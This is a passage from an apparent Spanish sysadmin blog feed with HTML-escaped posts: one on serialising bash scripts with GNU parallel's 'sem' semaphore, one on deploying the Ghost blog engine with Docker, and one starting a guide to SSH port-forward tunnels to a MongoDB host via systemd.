&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date +&lt;span class="s1"&gt;&amp;#39;%H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; - Ended process &lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nada en especial; este &lt;em&gt;script&lt;/em&gt; recibe un parámetro para identificar la ejecución que estamos mirando, y lo único que hace es perder el tiempo (usad la imaginación), previo registro de la hora de comienzo y de final. La ejecución no depara sorpresas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# ./do_stuff.sh &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:22:31 - Started process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:22:41 - Ended process &lt;span class="m"&gt;1&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Esperando en el semáforo&lt;/h2&gt;
&lt;p&gt;Como ya hemos mencionado, no nos interesaba que no ejecutaran mas de una vez concurrentemente. Para ello, vamos a disponer de un semáforo que deje pasar un solo proceso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# cat protected_do_stuff.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date +&lt;span class="s1"&gt;&amp;#39;%H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; - Semaphore for process &lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
sem --fg --id semaphore_do_stuff -j &lt;span class="m"&gt;1&lt;/span&gt; /root/do_stuff.sh &lt;span class="nv"&gt;$1&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto indica que el comando &lt;em&gt;sem&lt;/em&gt; se va a bloquear si ya hay otro proceso en marcha para el semáforo indicado con el &lt;em&gt;flag --id&lt;/em&gt;. El parámetro &lt;em&gt;-j&lt;/em&gt; indica el número de procesos que pueden pasar a la vez, que en este caso, es uno solo. Cuando no haya nada ejecutando en el semáforo, otro proceso podrá pasar a ejecutar un comando, que en este caso es el &lt;em&gt;script&lt;/em&gt; anterior, con el mismo parámetro identificativo.&lt;/p&gt;
&lt;p&gt;Vemos que si no hay competencia en el mismo semáforo, no nos ralentiza nada. De hecho, los semáforos con distinto identificador son independientes, y no interfieren entre ellos, aunque en este ejemplo solo usemos uno.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# ./protected_do_stuff.sh &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:30:50 - Semaphore &lt;span class="k"&gt;for&lt;/span&gt; process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:30:50 - Started process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:31:00 - Ended process &lt;span class="m"&gt;1&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Supongamos ahora que se lanza dos veces el mismo &lt;em&gt;script&lt;/em&gt;, con dos identificadores diferentes y con unos pocos segundos de diferencia. Los siguientes comandos se han lanzado desde dos sesiones de terminal distintas, ya que el proceso corre en primer plano.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# ./protected_do_stuff.sh &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:46 - Semaphore &lt;span class="k"&gt;for&lt;/span&gt; process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:47 - Started process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:57 - Ended process &lt;span class="m"&gt;1&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esperamos unos segundos y lanzamos el otro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# ./protected_do_stuff.sh &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:50 - Semaphore &lt;span class="k"&gt;for&lt;/span&gt; process &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:58 - Started process &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:36:08 - Ended process &lt;span class="m"&gt;2&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El primer proceso ha topado con el semáforo y ha empezado sin problemas en el mismo instante, aunque sin microsegundos no parece tan inmediato. Unos 4 segundos después se ha lanzado el otro comando, que ha tenido que esperar a que el primero acabara, antes de empezar. Esto se ve mejor si mezclamos las trazas de evento:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;46&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Semaphore&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Started&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Semaphore&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;57&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Ended&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;58&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Started&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Ended&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso se ve claramente que el proceso 2 queda parado en el semáforo hasta que el proceso 1 acaba, momento en el que puede empezar. Estoy seguro que esto tendrá muchas aplicaciones futuras.&lt;/p&gt;</content><category term="linux"></category><category term="semáforo"></category><category term="concurrencia"></category></entry><entry><title>Ghost: Un motor para hacer blogs</title><link href="http://www.linuxsysadmin.ml/2016/11/ghost-un-motor-para-hacer-blogs.html" rel="alternate"></link><published>2016-11-21T08:00:00+01:00</published><updated>2016-11-21T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-11-21:/2016/11/ghost-un-motor-para-hacer-blogs.html</id><summary type="html">&lt;p&gt;Hace tiempo que me recorre la idea de crear un motor genérico de &lt;em&gt;blogs&lt;/em&gt;. Son varias las veces que he empezado alguno aprovechando los &lt;em&gt;frameworks&lt;/em&gt;, especialmente de &lt;strong&gt;python&lt;/strong&gt;. Todas ellas han acabado en la papelera por falta de ganas. Finalmente me di por vencido y decidí utilizar algo ya hecho …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hace tiempo que me recorre la idea de crear un motor genérico de &lt;em&gt;blogs&lt;/em&gt;. Son varias las veces que he empezado alguno aprovechando los &lt;em&gt;frameworks&lt;/em&gt;, especialmente de &lt;strong&gt;python&lt;/strong&gt;. Todas ellas han acabado en la papelera por falta de ganas. Finalmente me di por vencido y decidí utilizar algo ya hecho.&lt;/p&gt;
&lt;p&gt;Prueba de mi pereza es este &lt;em&gt;blog&lt;/em&gt;, que está hecho con &lt;strong&gt;Pelican&lt;/strong&gt;, que es un generador de contenido estático, juntando un tema y un contenido. Como control de versiones usa &lt;strong&gt;git&lt;/strong&gt; y está alojado en &lt;strong&gt;Github Pages&lt;/strong&gt;. Para publicar hace falta crear el contenido, invocar algunos comandos para generar el contenido &lt;strong&gt;HTML&lt;/strong&gt; y levantar un servidor local para ver los cambios. Todo muy &lt;em&gt;techie&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;He seguido buscando para encontrar una solución con base de datos, que se rellene fácilmente mediante un formulario y que pueda utilizar cualquiera. Basta con mirar un poco por internet para ver que las soluciones con miles: desde los omnipresentes &lt;strong&gt;Wordpress&lt;/strong&gt; hasta los todopoderosos &lt;strong&gt;Drupal&lt;/strong&gt; y &lt;strong&gt;Joomla&lt;/strong&gt;, pasando por cosas mas esotéricas.&lt;/p&gt;
&lt;p&gt;La solución la encontré hace un par de meses; era bonita, simple y tenía material de soporte suficiente, sin ser agobiante. Se trata de &lt;a href="https://ghost.org/"&gt;Ghost&lt;/a&gt;, encontrando su repositorio en &lt;a href="https://github.com/TryGhost/Ghost"&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;La instalación es también muy simple:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Descargar la última versión de &lt;strong&gt;Ghost&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Descomprimir el fichero comprimido en la carpeta en donde lo queramos.&lt;/li&gt;
&lt;li&gt;Instalar las dependencias con &lt;em&gt;npm install --production&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Levantar el servicio con &lt;em&gt;npm start&lt;/em&gt; (desarrollo) o &lt;em&gt;npm start --production&lt;/em&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Y ya tenemos nuestro &lt;em&gt;blog&lt;/em&gt; visible en &lt;a href="http://localhost:2368/"&gt;http://localhost:2368/&lt;/a&gt; con su interfaz de administración en &lt;a href="http://localhost:2368/ghost/"&gt;http://localhost:2368/ghost/&lt;/a&gt;. Estos valores pueden cambiarse en el fichero &lt;em&gt;config.js&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El problema de esta aproximación es que la versión de &lt;strong&gt;Ghost&lt;/strong&gt;, de &lt;strong&gt;NPM&lt;/strong&gt; y de &lt;strong&gt;NodeJS&lt;/strong&gt; son demasiado importantes, exigiendo versiones elevadas que no están en los repositorios oficiales de la mayoría de distribuciones. Lo pude instalar en una &lt;em&gt;Ubuntu 16.04&lt;/em&gt; y, aun así, el binario exigido &lt;em&gt;/usr/bin/node&lt;/em&gt; no se llamaba así, sino que estaba en &lt;em&gt;/usr/bin/nodejs&lt;/em&gt;. Esto se puede solucionar con un simple enlace simbólico, pero busca el error...&lt;/p&gt;
&lt;p&gt;Lo que realmente me llamó a probarlo es la facilidad adicional de tenerlo funcionando sin problemas, mediante una imágen de &lt;strong&gt;Docker&lt;/strong&gt; prefabricada en &lt;strong&gt;DockerHub&lt;/strong&gt;. De hecho la imagen es oficial, y la podéis encontrar en &lt;a href="https://hub.docker.com/_/ghost/"&gt;https://hub.docker.com/_/ghost/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Levantamos la imagen con el habitual y recomendado &lt;em&gt;docker run&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@janus:~$ docker run -d -p &lt;span class="m"&gt;2368&lt;/span&gt;:2368 ghost
6a0d4ed51f2b7c04b7b0c54cac44256d12fe7fa999f548314858ea5838faae73
gerard@janus:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos da un &lt;strong&gt;Ghost&lt;/strong&gt; levantado en modo de &lt;em&gt;development&lt;/em&gt;. Si queremos levantarlo en modo &lt;em&gt;production&lt;/em&gt;, basta con añadir una variable de entorno &lt;em&gt;NODE_ENV=production&lt;/em&gt;. Tal como escribo este artículo, la configuración por defecto para producción está incompleta: falta la directiva &lt;em&gt;paths&lt;/em&gt; en la sección &lt;em&gt;production&lt;/em&gt;, aunque la podéis copiar tal cual de la sección &lt;em&gt;development&lt;/em&gt;. Las otras directivas las podéis editar según vuestras necesidades.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: si usáis &lt;strong&gt;docker&lt;/strong&gt;, no vale con poner una configuración adecuada en &lt;em&gt;/var/lib/ghost/config.js&lt;/em&gt;, porque entonces el instalador detecta que ya hay cosas y no copia el resto de ficheros en &lt;em&gt;/usr/src/ghost/&lt;/em&gt;. Vuestras configuraciones deberían reescribir el fichero &lt;em&gt;/usr/src/ghost/config.example.js&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@telesto:~/docker/custom_ghost$ cat Dockerfile 
FROM ghost
COPY config.js /usr/src/ghost/config.example.js
gerard@telesto:~/docker/custom_ghost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: la configuración de &lt;strong&gt;Ghost&lt;/strong&gt; es un &lt;em&gt;script&lt;/em&gt; en &lt;strong&gt;NodeJS&lt;/strong&gt; y es capaz de leer las variables de entorno, por si queréis pasar algunas variables en &lt;em&gt;runtime&lt;/em&gt;, sin construir varias imágenes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@telesto:~/docker/custom_ghost$ cat config.js 
var &lt;span class="nv"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,
    config&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nv"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    production: &lt;span class="o"&gt;{&lt;/span&gt;
        url: process.env&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GHOST_URL&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;,
        mail: &lt;span class="o"&gt;{}&lt;/span&gt;,
        database: &lt;span class="o"&gt;{&lt;/span&gt;
            client: &lt;span class="s1"&gt;&amp;#39;sqlite3&amp;#39;&lt;/span&gt;,
            connection: &lt;span class="o"&gt;{&lt;/span&gt;
                filename: path.join&lt;span class="o"&gt;(&lt;/span&gt;__dirname, &lt;span class="s1"&gt;&amp;#39;/content/data/ghost.db&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;,
            debug: &lt;span class="nb"&gt;false&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;,
        server: &lt;span class="o"&gt;{&lt;/span&gt;
            host: &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;,
            port: &lt;span class="s1"&gt;&amp;#39;2368&amp;#39;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;,
        paths: &lt;span class="o"&gt;{&lt;/span&gt;
            contentPath: path.join&lt;span class="o"&gt;(&lt;/span&gt;__dirname, &lt;span class="s1"&gt;&amp;#39;/content/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

module.exports &lt;span class="o"&gt;=&lt;/span&gt; config&lt;span class="p"&gt;;&lt;/span&gt;
gerard@telesto:~/docker/custom_ghost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Apuntamos nuestro navegador a la URL configurada, y ya tenemos un &lt;em&gt;blog&lt;/em&gt; funcional. Queda para el propietario ir a la sección de administración para añadir contenido, cambiar los temas y lo que haga falta, cómodamente desde la web.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ghost Blog" src="http://www.linuxsysadmin.ml/images/ghost_blog.jpg"&gt;&lt;/p&gt;
&lt;p&gt;La parte "mala" es que cada instancia de &lt;strong&gt;Ghost&lt;/strong&gt; es un proceso propio, que usa su propia dirección y su propio puerto. Si se quiere desplegar varios &lt;em&gt;blogs&lt;/em&gt; en el mismo servidor, podemos usar un &lt;strong&gt;nginx&lt;/strong&gt;, que los diferencie por el dominio solicitado mediante &lt;em&gt;virtualhosts&lt;/em&gt;; luego hacemos un &lt;em&gt;proxy_pass&lt;/em&gt; al puerto de verdad, y ya tenemos el servidor montado. Esto queda como material para otro artículo.&lt;/p&gt;</content><category term="ghost"></category><category term="blog"></category></entry><entry><title>Levantando túneles SSH con systemd</title><link href="http://www.linuxsysadmin.ml/2016/11/levantando-tuneles-ssh-con-systemd.html" rel="alternate"></link><published>2016-11-14T08:00:00+01:00</published><updated>2016-11-14T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-11-14:/2016/11/levantando-tuneles-ssh-con-systemd.html</id><summary type="html">&lt;p&gt;Ya vimos en un &lt;a href="http://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html"&gt;artículo anterior&lt;/a&gt; como levantar túneles &lt;strong&gt;SSH&lt;/strong&gt; para llegar a través del protocolo &lt;strong&gt;SSH&lt;/strong&gt;, a destinos que no están alcanzables normalmente. Esto está muy bien para aplicaciones puntuales, pero si tenemos que usar esos túneles una temporada, y deseamos que se mantengan levantados, ya es mas difícil …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos en un &lt;a href="http://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html"&gt;artículo anterior&lt;/a&gt; como levantar túneles &lt;strong&gt;SSH&lt;/strong&gt; para llegar a través del protocolo &lt;strong&gt;SSH&lt;/strong&gt;, a destinos que no están alcanzables normalmente. Esto está muy bien para aplicaciones puntuales, pero si tenemos que usar esos túneles una temporada, y deseamos que se mantengan levantados, ya es mas difícil.&lt;/p&gt;
&lt;p&gt;Hay miles de gestores de procesos que pueden hacer este trabajo por nosotros, como &lt;strong&gt;runit&lt;/strong&gt;, &lt;strong&gt;monit&lt;/strong&gt;, &lt;strong&gt;supervisor&lt;/strong&gt; entre otros. Personalmente no soy fan de instalar nada que proporcione una funcionalidad duplicada, así que... ¿por que no &lt;strong&gt;systemd&lt;/strong&gt;?&lt;/p&gt;
&lt;p&gt;Para este tutorial vamos a suponer que tenemos acceso a un servidor intermedio con &lt;strong&gt;SSH&lt;/strong&gt;, que ve a un servidor de bases de datos, y a través del que vamos a hacer el salto. Respectivamente, los vamos a llamar &lt;em&gt;jump&lt;/em&gt; y &lt;em&gt;database&lt;/em&gt;, en una explosión de creatividad.&lt;/p&gt;
&lt;h2&gt;El túnel básico&lt;/h2&gt;
&lt;p&gt;Lo primero es darnos cuenta que no llegamos a la base de datos; no importa que intentemos conectar a &lt;em&gt;localhost&lt;/em&gt; o a &lt;em&gt;database&lt;/em&gt; directamente. No llegamos y punto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ mongo
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.10
connecting to: &lt;span class="nb"&gt;test&lt;/span&gt;
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T15:39:25.766+0200 W NETWORK  &lt;span class="o"&gt;[&lt;/span&gt;thread1&lt;span class="o"&gt;]&lt;/span&gt; Failed to connect to &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:27017, reason: errno:111 Connection refused
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T15:39:25.766+0200 E QUERY    &lt;span class="o"&gt;[&lt;/span&gt;thread1&lt;span class="o"&gt;]&lt;/span&gt; Error: couldn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t connect to server &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:27017, connection attempt failed :
connect@src/mongo/shell/mongo.js:229:14
@&lt;span class="o"&gt;(&lt;/span&gt;connect&lt;span class="o"&gt;)&lt;/span&gt;:1:6

exception: connect failed
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a levantar un túnel &lt;strong&gt;SSH&lt;/strong&gt; que muestre en el puerto local 27017 el destino &lt;em&gt;database&lt;/em&gt;, al puerto 27017, tal como lo ve el servidor de salto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ ssh -L &lt;span class="m"&gt;27017&lt;/span&gt;:database:27017 jump@jump -N
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;jump&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es especialmente importante que pongamos autenticación por claves, de forma que no nos pida la contraseña para levantar el túnel. Ahora no es un gran problema, pero si pretendemos que lo haga &lt;strong&gt;systemd&lt;/strong&gt;, no podemos instruirle a poner una contraseña dada.&lt;/p&gt;
&lt;p&gt;Ahora podemos comprobar que si llegamos a la base de datos, en nuestro puerto local:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ mongo
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.10
connecting to: &lt;span class="nb"&gt;test&lt;/span&gt;
Server has startup warnings: 
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is &lt;span class="s1"&gt;&amp;#39;always&amp;#39;&lt;/span&gt;.
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; **        We suggest setting it to &lt;span class="s1"&gt;&amp;#39;never&amp;#39;&lt;/span&gt;
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&amp;gt; db.serverBuildInfo&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;3.2.10&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;gitVersion&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;79d9b3ab5ce20f51c272b4411202710a082d0317&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;modules&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;allocator&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;tcmalloc&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;javascriptEngine&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mozjs&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;sysInfo&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;deprecated&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;versionArray&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;
        &lt;span class="m"&gt;3&lt;/span&gt;,
        &lt;span class="m"&gt;2&lt;/span&gt;,
        &lt;span class="m"&gt;10&lt;/span&gt;,
        &lt;span class="m"&gt;0&lt;/span&gt;
    &lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;openssl&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;OpenSSL 1.0.1t  3 May 2016&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;compiled&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;OpenSSL 1.0.1t  3 May 2016&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;buildEnvironment&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;distmod&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;debian81&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;distarch&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;x86_64&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;cc&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;/opt/mongodbtoolchain/bin/gcc: gcc (GCC) 4.8.2&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;ccflags&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;-fno-omit-frame-pointer -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fno-builtin-memcmp&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;cxx&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;/opt/mongodbtoolchain/bin/g++: g++ (GCC) 4.8.2&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;cxxflags&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;-Wnon-virtual-dtor -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++11&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;linkflags&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;-fPIC -pthread -Wl,-z,now -rdynamic -fuse-ld=gold -Wl,-z,noexecstack -Wl,--warn-execstack&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;target_arch&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;x86_64&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;target_os&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;linux&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;bits&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;64&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt; : false,
